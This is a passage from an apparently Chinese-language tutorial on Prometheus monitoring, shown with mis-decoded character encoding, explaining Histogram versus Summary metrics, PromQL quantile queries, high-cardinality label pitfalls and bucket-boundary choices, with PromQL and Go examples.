<p>å› ä¸º <code>_bucket</code> æ˜¯ Counterï¼ˆç´¯ç§¯çš„ï¼‰ï¼Œä½ éœ€è¦è½¬æˆé€Ÿç‡ï¼š</p>
<pre><code class="hljs language-promql" lang="promql"># é”™è¯¯ï¼šç›´æ¥ç”¨ bucket
histogram_quantile(0.95, http_request_duration_seconds_bucket)
# è¿™ä¼šåŸºäº"æ€»ç´¯ç§¯å€¼"è®¡ç®—ï¼Œç»“æœæ˜¯é”™çš„

# æ­£ç¡®ï¼šå…ˆ rate() å†è®¡ç®—åˆ†ä½æ•°
histogram_quantile(0.95, rate(http_request_duration_seconds_bucket[5m]))
# è¿™æ˜¯åŸºäº"è¿‡å» 5 åˆ†é’Ÿçš„é€Ÿç‡"è®¡ç®—ï¼Œç»“æœæ‰å¯¹
</code></pre>
<p><strong>è®¡ç®—å¹³å‡å“åº”æ—¶é—´</strong></p>
<pre><code class="hljs language-promql" lang="promql"># ç”¨ sum å’Œ count è®¡ç®—å¹³å‡å€¼
rate(http_request_duration_seconds_sum[5m])
/
rate(http_request_duration_seconds_count[5m])
</code></pre>
<p><strong>å®æˆ˜æ¡ˆä¾‹</strong></p>
<p>å‡è®¾ä½ çš„ API ç›‘æ§æ˜¾ç¤ºï¼š</p>
<pre><code class="hljs language-promql" lang="promql"># å¹³å‡å“åº”æ—¶é—´
avg = 150ms

# P95
histogram_quantile(0.95, ...) = 200ms

# P99
histogram_quantile(0.99, ...) = 2000ms  â† æ³¨æ„è¿™é‡Œï¼
</code></pre>
<p>åˆ†æï¼š</p>
<ul>
<li>å¹³å‡ 150ms çœ‹èµ·æ¥ä¸é”™</li>
<li>P95 200ms ä¹Ÿè¿˜è¡Œ</li>
<li>ä½† P99 2000ms è¯´æ˜æœ‰ä¸¥é‡çš„é•¿å°¾é—®é¢˜</li>
</ul>
<p>å¯èƒ½çš„åŸå› ï¼š</p>
<ul>
<li>æŸäº›è¯·æ±‚è§¦å‘äº†æ…¢æŸ¥è¯¢</li>
<li>æŸäº›è¯·æ±‚æœ‰ GC åœé¡¿</li>
<li>æŸäº›è¯·æ±‚ç­‰å¾…å¤–éƒ¨æœåŠ¡è¶…æ—¶</li>
</ul>
<p>è¿™å°±æ˜¯ Histogram çš„ä»·å€¼ï¼š<strong>è®©é•¿å°¾é—®é¢˜æ— æ‰€éå½¢</strong>ã€‚</p>
<p><strong>Histogram çš„è®¾è®¡æ™ºæ…§</strong></p>
<p>Histogram æ˜¯å››ç§ç±»å‹ä¸­æœ€å¤æ‚çš„ï¼Œä½†ä¹Ÿæ˜¯è®¾è®¡æœ€ç²¾å¦™çš„ï¼š</p>
<ol>
<li>
<p><strong>ç‰ºç‰²ç²¾ç¡®ï¼Œæ¢å–æ•ˆç‡</strong></p>
<ul>
<li>ä¸å­˜æ¯ä¸ªè¯·æ±‚çš„å‡†ç¡®è€—æ—¶ï¼ˆå¤ªè´µï¼‰</li>
<li>åªå­˜åŒºé—´ç»Ÿè®¡ï¼ˆå¤Ÿç”¨ï¼‰</li>
<li>ä» 1000 æ¡æ•°æ®å‹ç¼©åˆ° 10 æ¡</li>
</ul>
</li>
<li>
<p><strong>ç”¨ç©ºé—´æ¢æ—¶é—´</strong></p>
<ul>
<li>æå‰åˆ†å¥½åŒºé—´ï¼ˆbucketï¼‰</li>
<li>æŸ¥è¯¢æ—¶åªéœ€è¦èšåˆï¼Œä¸éœ€è¦é‡æ–°è®¡ç®—</li>
<li>histogram_quantile() åŸºäºçº¿æ€§æ’å€¼ï¼Œé€Ÿåº¦å¿«</li>
</ul>
</li>
<li>
<p><strong>å¯èšåˆæ˜¯å…³é”®</strong></p>
<ul>
<li>å¤šä¸ªå®ä¾‹çš„ bucket å¯ä»¥ç›¸åŠ </li>
<li>è¿™æ˜¯ Histogram æ¯” Summary æ›´é€šç”¨çš„åŸå› </li>
<li>ç‰ºç‰²äº†å®¢æˆ·ç«¯è®¡ç®—æˆæœ¬ï¼Œæ¢æ¥äº†æœåŠ¡ç«¯çµæ´»æ€§</li>
</ul>
</li>
</ol>
<p>è¿™æ˜¯"ç®€å•æ¨¡å‹çœ‹é€å¤æ‚é—®é¢˜"çš„å·…å³°ä¹‹ä½œï¼šç”¨å‡ ä¸ªç´¯ç§¯çš„è®¡æ•°å™¨ï¼ˆbucketï¼‰ï¼Œé…åˆä¸€ä¸ªèšåˆå‡½æ•°ï¼ˆhistogram_quantileï¼‰ï¼Œå°±èƒ½çœ‹é€æ•´ä¸ªç³»ç»Ÿçš„æ€§èƒ½åˆ†å¸ƒã€‚</p>
<h3 data-id="heading-9">2.4 Summaryï¼ˆæ‘˜è¦ï¼‰</h3>
<p><strong>å®šä¹‰</strong></p>
<p>Summary å’Œ Histogram ç±»ä¼¼ï¼Œéƒ½æ˜¯ç”¨æ¥ç»Ÿè®¡åˆ†å¸ƒï¼Œä½†æœ‰ä¸ªå…³é”®åŒºåˆ«ï¼š<strong>åˆ†ä½æ•°åœ¨å“ªè®¡ç®—</strong>ã€‚</p>
<p><strong>Histogram vs Summary</strong></p>








































<table><thead><tr><th>å¯¹æ¯”ç»´åº¦</th><th>Histogram</th><th>Summary</th></tr></thead><tbody><tr><td>åˆ†ä½æ•°è®¡ç®—ä½ç½®</td><td>Prometheusï¼ˆæœåŠ¡ç«¯ï¼‰</td><td>Exporterï¼ˆå®¢æˆ·ç«¯ï¼‰</td></tr><tr><td>å­˜å‚¨å†…å®¹</td><td>bucket ç»Ÿè®¡</td><td>é¢„è®¡ç®—çš„åˆ†ä½æ•°</td></tr><tr><td>æŸ¥è¯¢æ—¶è®¡ç®—</td><td>éœ€è¦ç”¨ histogram_quantile()</td><td>ç›´æ¥è¯»</td></tr><tr><td>èƒ½å¦èšåˆ</td><td>èƒ½ï¼ˆå¤šå®ä¾‹ï¼‰</td><td>ä¸èƒ½</td></tr><tr><td>çµæ´»æ€§</td><td>å¯ä»¥ç®—ä»»æ„åˆ†ä½æ•°</td><td>åªèƒ½çœ‹é¢„è®¾çš„</td></tr><tr><td>å®¢æˆ·ç«¯å¼€é”€</td><td>å°ï¼ˆåªç»Ÿè®¡ bucketï¼‰</td><td>å¤§ï¼ˆè¦è®¡ç®—åˆ†ä½æ•°ï¼‰</td></tr></tbody></table>
<p><strong>Summary çš„ç»“æ„</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># TYPE http_request_duration_seconds summary</span>

http_request_duration_seconds{<span class="hljs-attr">quantile</span>=<span class="hljs-string">"0.5"</span>} <span class="hljs-number">0.232</span>
http_request_duration_seconds{<span class="hljs-attr">quantile</span>=<span class="hljs-string">"0.9"</span>} <span class="hljs-number">0.821</span>
http_request_duration_seconds{<span class="hljs-attr">quantile</span>=<span class="hljs-string">"0.99"</span>} <span class="hljs-number">1.523</span>

http_request_duration_seconds_sum 45.67
http_request_duration_seconds_count 200
</code></pre>
<p>æ³¨æ„ï¼š</p>
<ol>
<li>æ²¡æœ‰ <code>_bucket</code></li>
<li>ç›´æ¥ç»™å‡ºäº† <code>quantile="0.5"</code> ç­‰åˆ†ä½æ•°çš„å€¼</li>
<li>è¿™äº›åˆ†ä½æ•°æ˜¯åœ¨ Exporter é‡Œç®—å¥½çš„</li>
</ol>
<p><strong>ç”¨ç±»æ¯”ç†è§£</strong></p>
<pre><code class="hljs language-scss" lang="scss">Histogram æ–¹æ¡ˆï¼š
Java ä»£ç ç»Ÿè®¡ bucket â†’ å‘é€ç»™ Prometheus â†’ æŸ¥è¯¢æ—¶ç”¨ <span class="hljs-built_in">histogram_quantile</span>() è®¡ç®—

<span class="hljs-selector-tag">Summary</span> æ–¹æ¡ˆï¼š
Java ä»£ç ç›´æ¥è®¡ç®— P50/P90/P99 â†’ å‘é€ç»™ Prometheus â†’ æŸ¥è¯¢æ—¶ç›´æ¥è¯»
</code></pre>
<p>å°±åƒï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">Histogram</span> = ç»™ä½ é£Ÿæï¼Œä½ è‡ªå·±åšèœ
<span class="hljs-attr">Summary</span> = ç›´æ¥ç»™ä½ åšå¥½çš„èœ
</code></pre>
<p><strong>Summary ä¸ºä»€ä¹ˆä¸èƒ½èšåˆï¼Ÿ</strong></p>
<p>è¿™æ˜¯ä¸ªå…³é”®é™åˆ¶ã€‚</p>
<p>å‡è®¾æœ‰ 2 ä¸ªå®ä¾‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">å®ä¾‹ 1: <span class="hljs-attr">P90</span> = <span class="hljs-number">0.8</span> ç§’
å®ä¾‹ 2: <span class="hljs-attr">P90</span> = <span class="hljs-number">1.2</span> ç§’
</code></pre>
<p>é—®ï¼šæ•´ä½“çš„ P90 æ˜¯å¤šå°‘ï¼Ÿ</p>
<p>ç­”æ¡ˆï¼š<strong>ä¸çŸ¥é“</strong>ã€‚</p>
<p>ä½ ä¸èƒ½ç®€å•åœ°ï¼š</p>
<ul>
<li>æ±‚å¹³å‡ï¼š(0.8 + 1.2) / 2 = 1.0 ï¼Ÿ é”™ï¼</li>
<li>å–æœ€å¤§ï¼šmax(0.8, 1.2) = 1.2 ï¼Ÿ é”™ï¼</li>
</ul>
<p>å› ä¸ºåˆ†ä½æ•°ä¸èƒ½è¿™æ ·ç®—ã€‚åªæœ‰åŸå§‹æ•°æ®ï¼ˆæˆ– bucket ç»Ÿè®¡ï¼‰æ‰èƒ½æ­£ç¡®èšåˆã€‚</p>
<pre><code class="hljs language-promql" lang="promql"># Histogram å¯ä»¥èšåˆ
histogram_quantile(0.9, 
  sum(rate(http_request_duration_seconds_bucket[5m])) by (le)
)
# å…ˆæŠŠå¤šä¸ªå®ä¾‹çš„ bucket åŠ èµ·æ¥ï¼Œå†è®¡ç®— P90

# Summary ä¸èƒ½èšåˆ
sum(http_request_duration_seconds{quantile="0.9"})
# è¿™æ ·åšæ˜¯é”™çš„ï¼æŠŠå¤šä¸ªå®ä¾‹çš„ P90 åŠ èµ·æ¥æ¯«æ— æ„ä¹‰
</code></pre>
<p><strong>ä»€ä¹ˆæ—¶å€™ç”¨ Summaryï¼Ÿ</strong></p>
<p>é€‚åˆ Summary çš„åœºæ™¯ï¼š</p>
<ol>
<li><strong>å•å®ä¾‹åº”ç”¨</strong>ï¼šä¸éœ€è¦èšåˆ</li>
<li><strong>æŸ¥è¯¢æ€§èƒ½æ•æ„Ÿ</strong>ï¼šSummary æŸ¥è¯¢æ›´å¿«ï¼ˆä¸éœ€è¦è®¡ç®—ï¼‰</li>
<li><strong>åˆ†ä½æ•°å›ºå®š</strong>ï¼šä½ ç¡®å®šåªéœ€è¦ P50/P90/P99</li>
</ol>
<p>å…¸å‹ä¾‹å­ï¼šGo ç¨‹åºçš„ GC æ—¶é—´ç›‘æ§ï¼ˆå®˜æ–¹åº“é»˜è®¤ç”¨ Summaryï¼‰</p>
<pre><code class="hljs language-ini" lang="ini">go_gc_duration_seconds{<span class="hljs-attr">quantile</span>=<span class="hljs-string">"0"</span>} <span class="hljs-number">0.000042</span>
go_gc_duration_seconds{<span class="hljs-attr">quantile</span>=<span class="hljs-string">"0.25"</span>} <span class="hljs-number">0.000065</span>
go_gc_duration_seconds{<span class="hljs-attr">quantile</span>=<span class="hljs-string">"0.5"</span>} <span class="hljs-number">0.000077</span>
go_gc_duration_seconds{<span class="hljs-attr">quantile</span>=<span class="hljs-string">"0.75"</span>} <span class="hljs-number">0.000091</span>
go_gc_duration_seconds{<span class="hljs-attr">quantile</span>=<span class="hljs-string">"1"</span>} <span class="hljs-number">0.001752</span>
</code></pre>
<p><strong>Histogram vs Summary é€‰æ‹©å»ºè®®</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">ä½ çš„åœºæ™¯                        â†’  æ¨èç±»å‹
----------------------------------------------</span>
å¤šå®ä¾‹ï¼Œéœ€è¦èšåˆ                â†’  Histogram
å•å®ä¾‹                          â†’  Summary æˆ– Histogram
ä¸ç¡®å®šéœ€è¦å“ªäº›åˆ†ä½æ•°            â†’  Histogram
éœ€è¦é¢„æµ‹æœªæ¥çš„åˆ†ä½æ•°            â†’  Histogram
å®¢æˆ·ç«¯èµ„æºå—é™                  â†’  Histogram
æŸ¥è¯¢æ€§èƒ½è¦æ±‚æé«˜                â†’  Summary
</code></pre>
<p><strong>å®æˆ˜å»ºè®®</strong>ï¼šä¼˜å…ˆç”¨ Histogramï¼Œé™¤éæœ‰ç‰¹æ®ŠåŸå› ã€‚</p>
<p><strong>Summary çš„è®¾è®¡å“²å­¦</strong></p>
<p>Summary ä½“ç°äº†ä¸€ä¸ªæœ‰è¶£çš„æƒè¡¡ï¼š<strong>å®¢æˆ·ç«¯è®¡ç®— vs æœåŠ¡ç«¯çµæ´»æ€§</strong>ã€‚</p>
<ul>
<li>Histogramï¼šå®¢æˆ·ç«¯ç®€å•ï¼ŒæœåŠ¡ç«¯å¼ºå¤§ï¼ˆå¯ä»¥ç®—ä»»æ„åˆ†ä½æ•°ï¼‰</li>
<li>Summaryï¼šå®¢æˆ·ç«¯å¤æ‚ï¼ŒæœåŠ¡ç«¯ç®€å•ï¼ˆåªèƒ½çœ‹é¢„è®¾çš„åˆ†ä½æ•°ï¼‰</li>
</ul>
<p>Prometheus æœ€ç»ˆé€‰æ‹©è®© Histogram æˆä¸ºä¸»åŠ›ï¼ŒSummary ä½œä¸ºç‰¹æ®Šåœºæ™¯çš„è¡¥å……ã€‚è¿™ä¸ªé€‰æ‹©èƒŒåçš„æ€è€ƒæ˜¯ï¼š</p>
<p><strong>ç›‘æ§ç³»ç»Ÿåº”è¯¥æŠŠå¤æ‚æ€§ç•™åœ¨æœåŠ¡ç«¯ï¼ˆPrometheusï¼‰ï¼Œè®©å®¢æˆ·ç«¯ï¼ˆExporterï¼‰å°½å¯èƒ½ç®€å•ã€‚</strong></p>
<p>è¿™åˆå›åˆ°äº†å¼€å¤´çš„å“²å­¦ï¼šç®€å•ä¼˜å…ˆã€‚å³ä½¿ Summary æŸ¥è¯¢æ›´å¿«ï¼Œä½†å®ƒç‰ºç‰²äº†çµæ´»æ€§ï¼Œä¹Ÿå¢åŠ äº†å®¢æˆ·ç«¯çš„å¤æ‚åº¦ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼ŒHistogram è™½ç„¶æŸ¥è¯¢æ—¶éœ€è¦è®¡ç®—ï¼Œä½†å®¢æˆ·ç«¯æ›´ç®€å•ï¼Œä¹Ÿæ›´é€šç”¨ã€‚</p>
<p><strong>å››ç§ç±»å‹çš„æœ¬è´¨</strong></p>
<p>åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“å››ç§ç±»å‹çš„æœ¬è´¨äº†ï¼š</p>






























<table><thead><tr><th>ç±»å‹</th><th>æœ¬è´¨</th><th>è®¾è®¡æ™ºæ…§</th></tr></thead><tbody><tr><td>Counter</td><td>åªå¢çš„ç´¯ç§¯å™¨</td><td>ç‰ºç‰²ç»å¯¹ç²¾ç¡®ï¼Œä¸“æ³¨é€Ÿç‡å’Œè¶‹åŠ¿</td></tr><tr><td>Gauge</td><td>å¯å˜çš„å¿«ç…§</td><td>ä¸å…³å¿ƒå†å²ï¼Œåªå…³å¿ƒå½“å‰</td></tr><tr><td>Histogram</td><td>åˆ†å¸ƒçš„å‹ç¼©</td><td>ç‰ºç‰²ç²¾ç¡®åº¦ï¼Œæ¢å–å­˜å‚¨å’Œè®¡ç®—æ•ˆç‡</td></tr><tr><td>Summary</td><td>é¢„è®¡ç®—çš„ç»“æœ</td><td>å®¢æˆ·ç«¯å¤æ‚ï¼ŒæœåŠ¡ç«¯ç®€å•</td></tr></tbody></table>
<p>å››ç§ç±»å‹ï¼Œè¦†ç›–äº†ç›‘æ§çš„æ‰€æœ‰åœºæ™¯ï¼š</p>
<ul>
<li>éœ€è¦ç´¯ç§¯ï¼ŸCounter</li>
<li>éœ€è¦å½“å‰çŠ¶æ€ï¼ŸGauge</li>
<li>éœ€è¦çœ‹åˆ†å¸ƒï¼ŸHistogram</li>
<li>éœ€è¦æè‡´æ€§èƒ½ï¼ŸSummary</li>
</ul>
<p>è¿™å°±æ˜¯"ç”¨æœ€å°‘çš„ç±»å‹æè¿°æœ€å¤šçš„åœºæ™¯"çš„æ™ºæ…§ã€‚</p>
<hr/>
<h2 data-id="heading-10">3. Histogramï¼šå¦‚ä½•ä¼˜é›…åœ°å¤„ç†åˆ†å¸ƒé—®é¢˜</h2>
<h3 data-id="heading-11">3.1 é«˜åŸºæ•°é—®é¢˜</h3>
<p>è¿™æ˜¯ä½¿ç”¨ Histogram æ—¶æœ€å®¹æ˜“è¸©çš„å‘ã€‚</p>
<p><strong>ä¸€ä¸ª Histogram ä¼šç”Ÿæˆå¤šå°‘æ—¶é—´åºåˆ—ï¼Ÿ</strong></p>
<p>å‡è®¾ä½ æœ‰ 10 ä¸ª bucketï¼Œé‚£ä¹ˆä¸€ä¸ª Histogram æŒ‡æ ‡ä¼šç”Ÿæˆï¼š</p>
<pre><code class="hljs language-ini" lang="ini">10 ä¸ª _bucket + 1 ä¸ª _sum + 1 ä¸ª <span class="hljs-attr">_count</span> = <span class="hljs-number">12</span> æ¡æ—¶é—´åºåˆ—
</code></pre>
<p>ç°åœ¨çœ‹çœ‹é«˜åŸºæ•°é—®é¢˜ï¼š</p>
<p><strong>åœºæ™¯ 1ï¼šä½åŸºæ•°æ ‡ç­¾</strong></p>
<pre><code class="hljs language-promql" lang="promql">http_request_duration_seconds_bucket{service="api", path="/users", le="0.1"}
</code></pre>
<p>æ ‡ç­¾ç»„åˆï¼š</p>
<ul>
<li>service: 5 ä¸ªæœåŠ¡</li>
<li>path: 20 ä¸ªæ¥å£</li>
<li>le: 10 ä¸ª bucket</li>
</ul>
<p>æ€»æ—¶é—´åºåˆ—æ•°ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">5 Ã— 20 Ã— <span class="hljs-attr">10</span> = <span class="hljs-number">1000</span> æ¡ï¼ˆåªæ˜¯ bucketï¼‰
1000 + 5Ã—20Ã—<span class="hljs-attr">2</span> = <span class="hljs-number">1200</span> æ¡ï¼ˆåŠ ä¸Š sum å’Œ countï¼‰
</code></pre>
<p>è¿™å®Œå…¨å¯ä»¥æ¥å—ã€‚</p>
<p><strong>åœºæ™¯ 2ï¼šé«˜åŸºæ•°æ ‡ç­¾</strong></p>
<pre><code class="hljs language-promql" lang="promql"># é”™è¯¯ç¤ºä¾‹ï¼
http_request_duration_seconds_bucket{user_id="123456", le="0.1"}
</code></pre>
<p>æ ‡ç­¾ç»„åˆï¼š</p>
<ul>
<li>user_id: 100 ä¸‡ç”¨æˆ·</li>
<li>le: 10 ä¸ª bucket</li>
</ul>
<p>æ€»æ—¶é—´åºåˆ—æ•°ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">1,000,000 Ã— <span class="hljs-attr">10</span> = <span class="hljs-number">10</span>,<span class="hljs-number">000</span>,<span class="hljs-number">000</span> æ¡ï¼ˆåªæ˜¯ bucketï¼‰
10,000,000 + 1,000,000 Ã— <span class="hljs-attr">2</span> = <span class="hljs-number">12</span>,<span class="hljs-number">000</span>,<span class="hljs-number">000</span> æ¡ï¼ˆåŠ ä¸Š sum å’Œ countï¼‰
</code></pre>
<p>è¿™ä¼šç›´æ¥æŠŠ Prometheus æ‰“çˆ†ï¼</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A[100ä¸ªæœåŠ¡] --&gt; B[ä½åŸºæ•°æ–¹æ¡ˆ 1200æ¡]
    A --&gt; C[é«˜åŸºæ•°æ–¹æ¡ˆ 100ä¸‡ç”¨æˆ·]
    C --&gt; D[1200ä¸‡æ¡æ—¶é—´åºåˆ—]
    
    style B fill:#ccffcc
    style D fill:#ffcccc
</code></pre>
<p><strong>é«˜åŸºæ•°æ”¾å¤§æ•ˆåº”</strong></p>
<p>å¯¹æ¯” Gauge å’Œ Histogramï¼š</p>



































<table><thead><tr><th>æ ‡ç­¾ç»„åˆæ•°</th><th>Gauge</th><th>Histogram (10 bucket)</th><th>æ”¾å¤§å€æ•°</th></tr></thead><tbody><tr><td>100</td><td>100</td><td>1,200</td><td>12x</td></tr><tr><td>1,000</td><td>1,000</td><td>12,000</td><td>12x</td></tr><tr><td>10,000</td><td>10,000</td><td>120,000</td><td>12x</td></tr><tr><td>100,000</td><td>100,000</td><td>1,200,000</td><td>12x</td></tr></tbody></table>
<p><strong>Histogram æŠŠåŸºæ•°æ”¾å¤§äº† (bucketæ•° + 2) å€ï¼</strong></p>
<p><strong>å¦‚ä½•é¿å…ï¼Ÿ</strong></p>
<ol>
<li><strong>ä¸è¦åœ¨é«˜åŸºæ•°æ ‡ç­¾ä¸Šç”¨ Histogram</strong></li>
</ol>
<pre><code class="hljs language-promql" lang="promql"># é”™è¯¯
http_duration{user_id="..."}  # user_id æ˜¯é«˜åŸºæ•°
http_duration{ip="..."}       # IP æ˜¯é«˜åŸºæ•°
http_duration{trace_id="..."}  # trace_id æ˜¯é«˜åŸºæ•°

# æ­£ç¡®
http_duration{service="...", path="..."}  # ä½åŸºæ•°
</code></pre>
<ol start="2">
<li><strong>ç”¨è·¯å¾„æ¨¡æ¿ä»£æ›¿å…·ä½“è·¯å¾„</strong></li>
</ol>
<pre><code class="hljs language-promql" lang="promql"># é”™è¯¯
http_duration{path="/api/users/123456"}  # æ¯ä¸ªç”¨æˆ·IDä¸€ä¸ªè·¯å¾„

# æ­£ç¡®
http_duration{path="/api/users/:id"}     # æ¨¡æ¿åŒ–è·¯å¾„
</code></pre>
<ol start="3">
<li><strong>å‡å°‘ bucket æ•°é‡</strong></li>
</ol>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// ä¸è¦è®¾ç½®å¤ªå¤š bucket</span>
buckets := []<span class="hljs-type">float64</span>{
    <span class="hljs-number">0.001</span>, <span class="hljs-number">0.005</span>, <span class="hljs-number">0.01</span>, <span class="hljs-number">0.025</span>, <span class="hljs-number">0.05</span>, <span class="hljs-number">0.075</span>, <span class="hljs-number">0.1</span>,
    <span class="hljs-number">0.25</span>, <span class="hljs-number">0.5</span>, <span class="hljs-number">0.75</span>, <span class="hljs-number">1.0</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">5.0</span>, <span class="hljs-number">7.5</span>, <span class="hljs-number">10.0</span>,
}  <span class="hljs-comment">// 15 ä¸ª bucketï¼Œå¤ªå¤šäº†ï¼</span>

<span class="hljs-comment">// ç®€åŒ–åˆ°å¿…è¦çš„ bucket</span>
buckets := []<span class="hljs-type">float64</span>{<span class="hljs-number">0.1</span>, <span class="hljs-number">0.5</span>, <span class="hljs-number">1.0</span>, <span class="hljs-number">5.0</span>}  <span class="hljs-comment">// 4 ä¸ª bucket å¤Ÿç”¨</span>
</code></pre>
<h3 data-id="heading-12">3.2 bucket è¾¹ç•Œå¦‚ä½•è®¾ç½®ï¼Ÿ</h3>
<p>è¿™æ˜¯ä¸ªå¸¸è§é—®é¢˜ï¼šbucket çš„ <code>le</code> å€¼åº”è¯¥è®¾å¤šå°‘ï¼Ÿ</p>
<p><strong>åŸåˆ™ 1ï¼šè¦†ç›–ä½ å…³å¿ƒçš„èŒƒå›´</strong></p>
<p>æ¯”å¦‚ä½ çš„ APIï¼š</p>
<ul>
<li>æ­£å¸¸æƒ…å†µä¸‹ï¼š50-200ms</li>
<li>å¯æ¥å—èŒƒå›´ï¼š&lt; 500ms</li>
<li>è¶…æ—¶è®¾ç½®ï¼š5 ç§’</li>
</ul>
<p>é‚£ä¹ˆ bucket å¯ä»¥è®¾ç½®ä¸ºï¼š</p>
<pre><code class="hljs language-go" lang="go">buckets := []<span class="hljs-type">float64</span>{<span class="hljs-number">0.05</span>, <span class="hljs-number">0.1</span>, <span class="hljs-number">0.2</span>, <span class="hljs-number">0.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>}
<span class="hljs-comment">// è¦†ç›–äº† 50ms, 100ms, 200ms, 500ms, 1s, 5s</span>
</code></pre>
<p><strong>åŸåˆ™ 2ï¼šåˆ†å¸ƒè¦åˆç†</strong></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// ä¸å¥½ï¼šé›†ä¸­åœ¨å°èŒƒå›´</span>
buckets := []<span class="hljs-type">float64</span>{<span class="hljs-number">0.1</span>, <span class="hljs-number">0.11</span>, <span class="hljs-number">0.12</span>, <span class="hljs-number">0.13</span>, <span class="hljs-number">10</span>}

<span class="hljs-comment">// å¥½ï¼šå‡åŒ€åˆ†å¸ƒ</span>
buckets := []<span class="hljs-type">float64</span>{<span class="hljs-number">0.1</span>, <span class="hljs-number">0.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>}
</code></pre>
<p><strong>åŸåˆ™ 3ï¼šè€ƒè™‘è®¡ç®—ç²¾åº¦</strong></p>
<p>åˆ†ä½æ•°è®¡ç®—æ˜¯åŸºäºçº¿æ€§æ’å€¼çš„ï¼Œbucket è¶Šå¯†é›†ï¼Œç²¾åº¦è¶Šé«˜ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">bucket è®¾ç½®: <span class="hljs-section">[0.1, 1.0, 10.0]</span>

å¦‚æœ P95 è½åœ¨ 1.0 - 10.0 ä¹‹é—´
Prometheus ä¼šç”¨çº¿æ€§æ’å€¼ä¼°ç®—
ç²¾åº¦è¾ƒä½ï¼ˆè·¨åº¦å¤ªå¤§ï¼‰

bucket è®¾ç½®: <span class="hljs-section">[0.1, 0.5, 1.0, 2.0, 5.0, 10.0]</span>

å¦‚æœ P95 è½åœ¨ 1.0 - 2.0 ä¹‹é—´
ç²¾åº¦ä¼šæ›´é«˜ï¼ˆè·¨åº¦å°ï¼‰
</code></pre>
<p><strong>Prometheus é»˜è®¤çš„ bucket</strong></p>
<p>Prometheus å®˜æ–¹åº“çš„é»˜è®¤ bucket æ˜¯ï¼š</p>
<pre><code class="hljs language-go" lang="go">[<span class="hljs-number">0.005</span>, <span class="hljs-number">0.01</span>, <span class="hljs-number">0.025</span>, <span class="hljs-number">0.05</span>, <span class="hljs-number">0.1</span>, <span class="hljs-number">0.25</span>, <span class="hljs-number">0.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>]
</code></pre>
<p>è¿™ä¸ªè®¾ç½®è¦†ç›–äº†ä» 5ms åˆ° 10s çš„èŒƒå›´ï¼Œå¯¹å¤§å¤šæ•° API æ¥è¯´å¤Ÿç”¨ã€‚</p>
<h3 data-id="heading-13">3.3 _sum å’Œ _count çš„ä½œç”¨</h3>
<p>Histogram çš„ <code>_sum</code> å’Œ <code>_count</code> ä¸æ˜¯å¼ºåˆ¶çš„ï¼Œä½†å¼ºçƒˆå»ºè®®æœ‰ã€‚</p>
<p><strong>ä½œç”¨ 1ï¼šè®¡ç®—å¹³å‡å€¼</strong></p>
<pre><code class="hljs language-promql" lang="promql">rate(http_request_duration_seconds_sum[5m])
/
rate(http_request_duration_seconds_count[5m])
</code></pre>
<p>å¦‚æœæ²¡æœ‰ <code>_sum</code> å’Œ <code>_count</code>ï¼Œä½ ç®—ä¸å‡ºå¹³å‡å€¼ã€‚</p>
<p><strong>ä½œç”¨ 2ï¼šè®¡ç®—è¯·æ±‚é€Ÿç‡</strong></p>
<pre><code class="hljs language-promql" lang="promql">rate(http_request_duration_seconds_count[5m])
</code></pre>
<p>è¿™ç­‰ä»·äºï¼š</p>
<pre><code class="hljs language-promql" lang="promql">rate(http_requests_total[5m])
</code></pre>
<p>æ‰€ä»¥ <code>_count</code> å…¶å®å°±æ˜¯ä¸ª Counterï¼Œè®°å½•è¯·æ±‚æ€»æ•°ã€‚</p>
<p><strong>ä½œç”¨ 3ï¼šæ£€æŸ¥æ•°æ®ä¸€è‡´æ€§</strong></p>
<pre><code class="hljs language-promql" lang="promql"># _count åº”è¯¥ç­‰äºæœ€å¤§çš„ bucket
http_request_duration_seconds_count
==
http_request_duration_seconds_bucket{le="+Inf"}
</code></pre>
<p>å¦‚æœä¸ç›¸ç­‰ï¼Œè¯´æ˜æ•°æ®æœ‰é—®é¢˜ã€‚</p>
<p><strong>å®˜æ–¹å®¢æˆ·ç«¯åº“ä¼šè‡ªåŠ¨ç”Ÿæˆ</strong></p>
<p>ç”¨å®˜æ–¹åº“ï¼ˆGoã€Javaã€Pythonï¼‰ä¸ç”¨æ“å¿ƒï¼Œå®ƒä»¬ä¼šè‡ªåŠ¨ç»´æŠ¤ <code>_sum</code> å’Œ <code>_count</code>ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// Go ä»£ç </span>
histogram := prometheus.NewHistogram(...)
histogram.Observe(<span class="hljs-number">0.234</span>)  <span class="hljs-comment">// è‡ªåŠ¨æ›´æ–° _bucketã€_sumã€_count</span>
</code></pre>
<p>åªæœ‰æ‰‹å†™ Exporter æ—¶æ‰éœ€è¦æ³¨æ„ã€‚</p>
<p><strong>Histogram è®¾è®¡çš„æ·±å±‚æ€è€ƒ</strong></p>
<p>Histogram çš„ä¸‰ä¸ªè®¾è®¡ç»†èŠ‚ï¼ˆbucket ç´¯ç§¯ã€é«˜åŸºæ•°é—®é¢˜ã€_sum/_countï¼‰éƒ½æŒ‡å‘ä¸€ä¸ªæ ¸å¿ƒæ€æƒ³ï¼š</p>
<p><strong>åœ¨æ€§èƒ½ã€ç²¾åº¦ã€çµæ´»æ€§ä¹‹é—´æ‰¾åˆ°æœ€ä½³å¹³è¡¡ç‚¹ã€‚</strong></p>
<ul>
<li>bucket ç´¯ç§¯ï¼šè®©èšåˆå˜ç®€å•ï¼ˆç›´æ¥ç›¸åŠ ï¼‰</li>
